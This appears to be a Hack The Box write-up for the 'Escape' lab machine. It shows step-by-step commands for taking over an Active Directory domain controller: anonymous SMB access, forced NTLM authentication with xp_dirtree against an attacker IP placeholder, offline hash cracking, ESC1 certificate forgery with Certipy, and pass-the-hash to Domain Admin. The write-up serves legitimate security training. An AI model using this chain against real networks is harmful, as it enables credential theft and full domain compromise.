# HTB - Escape 
## Enumeration

Started with a standard nmap scan:

```bash
sudo nmap -sV 10.129.228.253
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-13 01:56:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

It's a DC, let's add `sequel.htb` to `/etc/hosts`.

### SMB

Let's see if anonymous share access is enabled:

```bash
smbclient -N -L //10.129.228.253
```

We can list anonymous shares, let's join the `Public` share:

```bash
smbclient -N //10.129.228.253/Public
```

We find an interesting PDF, let's download it:

```
get "SQL Server Procedures.pdf"
```

Let's open it:

```bash
xdg-open "SQL Server Procedures.pdf"
```

We find cleartext credentials in the document:

> **Bonus**
> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user `PublicUser` and password `GuestUserCantWrite1`.
> Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".

## Foothold

Let's connect to the MSSQL instance:

```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

Spin up Responder on the VPN interface to listen for incoming SMB auth, then from the SQL session trigger `xp_dirtree` pointing at our IP so the service account authenticates to us — Responder captures its NetNTLMv2 hash, which we then crack offline with john + rockyou.

```bash
# terminal 1: listener
sudo responder -I tun0 -v
```

```sql
-- terminal 2: from the SQL session
EXEC MASTER.sys.xp_dirtree '\\<YOUR_IP>\test', 1, 1
```

```bash
# once captured, crack it
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

We connect via evil-winrm with the discovered credentials:

```bash
evil-winrm -i 10.129.228.253 -u sql_svc -p 'REGGIE1234ronnie'
```

## Lateral Movement

We find cleartext credentials in the SQL logs:

```powershell
type C:\sqlserver\Logs\ERRORLOG.bak
```

Then login via evil-winrm:

```bash
evil-winrm -i 10.129.228.253 -u ryan.cooper -p 'NuclearMosquito3'
```

We find `user.txt` in `C:\Users\Ryan.Cooper\Desktop`.

## Privilege Escalation

In the initial nmap scan we found different ports related to certificate services, let's check for vulnerable certs with Certipy:

```bash
certipy find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout
```

Found the `UserAuthentication` template vulnerable to **ESC1** (`ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU + `Domain Users` enrollment rights) via Certipy enumeration.

Requested a certificate as `ryan.cooper` but specifying `administrator@sequel.htb` in the UPN field, exploiting the template's trust in attacker-supplied subject info:

```bash
certipy req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -upn administrator@sequel.htb -target sequel.htb -ca sequel-DC-CA -template UserAuthentication
```

This produced `administrator.pfx`. Since the local clock was skewed from the DC (breaking Kerberos), we wrapped the auth step with `skewrun` instead of changing the system clock:

```bash
skewrun 10.129.228.253 -- certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

This used the forged certificate to request a TGT via PKINIT and extract the Administrator's NT hash: `a52f78e4c751e5f5e17e1e9f3e58f4ee`.

Finally, Pass-the-Hash over WinRM to get a shell as Domain Admin:

```bash
evil-winrm -i 10.129.228.253 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

`root.txt` found in `C:\Users\Administrator\Desktop`.
